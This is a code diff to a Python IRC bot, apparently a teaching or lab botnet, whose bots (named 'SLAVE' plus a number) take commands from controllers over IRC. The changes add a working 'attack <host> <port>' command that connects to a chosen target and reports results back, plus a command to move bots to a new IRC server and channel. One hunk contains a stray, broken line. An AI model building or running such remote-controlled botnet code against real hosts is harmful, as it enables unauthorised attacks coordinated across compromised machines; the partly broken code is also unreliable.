@@ -14,12 +14,13 @@ class Bot:
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        # CONTROLLER INFO
+        # BOT INFO
         self.botNick = "SLAVE" + str(random.randrange(10000))
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
+        self.attackCount = 0
 
-        # BOT INFO
+        # BOT INFO - This is from controller
         self.botList = []
         self.botsSuccessful = []
         self.botsFailed = []
@@ -93,8 +94,8 @@ class Bot:
                 self.privateMsg(prefix, "!STATUS! " + self.botNick)
             elif message.startswith("attack"):
                 if len(message.split()) == 3:
-                    hostTarget = message[1]
-                    portTarget = message[2]
+                    hostTarget = message.split()[1]
+                    portTarget = message.split()[2]
                     self.botAttack(hostTarget, portTarget)
                 else:
                     print("Incorrect usage of command: attack <host-name> <port>")
@@ -119,10 +120,23 @@ class Bot:
     def botAttack(self, host, port):
         global conNick, botNick, attackCount 
         try:
-            attackCount = attackCount + 1 
+            targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            port = int(port)
+            targetSocket.connect((host, port))
+            print(self.botNick)
+            self.attackCount = self.attackCount + 1 
+            msg = str(self.botNick) + " " + str(self.attackCount) + "\n"
+            targetSocket.send(msg.encode())
             # Send private message that attack was successful
-            sendPrivate(str(botNick) + " has successdfully attacked server.\n current count: " + str(attackCount))
+            msg = (self.botNick) + " has successdfully attacked server. Current count is: " + str(self.attackCount)
+            for x in self.acceptedCons:
+                self.privateMsg(x, msg)
         except:
+            msg = self.botNick + " has failed to attack. Current count is: " + str(self.attackCount)
+            for x in self.acceptedCons:
+                self.privateMsg(x, msg)
+            tb = traceback.format_exc()
+            print(tb)
             pass 
             # Send private message that attack failed 
     
@@ -132,34 +146,19 @@ class Bot:
         # First attempt to connect to new server 
         try:
             newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            print("HOST: " + str(newHost))
-            print("PORT: " + str(newPort))
             newPort = int(newPort)
-            print("DEBUG: before connect")
+
+            # Have this here bc had issues trying to connect to same server
             try:
-                print("DEBUG: in Try")
                 newSocket.connect((newHost, newPort))
             except:
-                print("DEBUG: in Except")
                 newSocket = self.IRCSOCKET
-                #self.privateMsg((str(self.botNick) + " is in the same server. Attempting to move to new channel only"))
 
-            #self.IRCSOCKET.send(msg.encode())
             # At this point, if it doesn't throw an exception, it should be good 
             # Now connect bot to channel
-            
-            print("DEBUG: Out of tru")
-            #newSocket.send(("NICK {}\n" .format(self.botNick)).encode())
-            #newSocket.send(("USER bot * * :{}\n" .format(self.botNick)).encode())
-            #newSocket.send(("JOIN #{}\n" .format(self.CHANNEL)).encode())
             self.IRCconnect(newChannel)
-            print("DEBUG: Just tried to connect newSocket stuff")
             resp = self.getData()
             print(resp)
-            print("DEBUG: I moved ")
-            
-
-            
 
             # If it reaches this point, connection is successful. Change globals
             print("I atleast reached here")
@@ -171,13 +170,16 @@ class Bot:
                 self.IRCSOCKET.close()
                 self.IRCSOCKET = newSocket 
             except:
-                print("If it is in the same server it doesnt handle it well idk")
+                pass
+            for x in acceptedCons:
+                self.privateMsg(x, self.botNick + " has moved to " + str(self.HOST) + " " + str(self.PORT) + " " + str(self.CHANNEL))
             return True 
         except:
             print("ERROR: Unable to move to new channel\nBot still in old channel")
             tb = traceback.format_exc()
             print(tb)
-            self.privateMsg("Unable to move to new server.")
+            for x in acceptedCons:
+                self.privateMsg(x, "Unable to move to new server. Bot still in old channel")
             return False 
         
     # Read
@@ -198,6 +200,9 @@ class Bot:
                             #self.createNick(self.NICK)
                             #self.connectIRC(self.s,self.NICK, self.chan)  
                             # Use this to make new nickname if needed
+                            oldName = self.botNick 
+                            s
+                            botNick = "SLAVE" + str(random.randrange(10000))
                             pass
         except Exception as e:
             print("Exception: ")
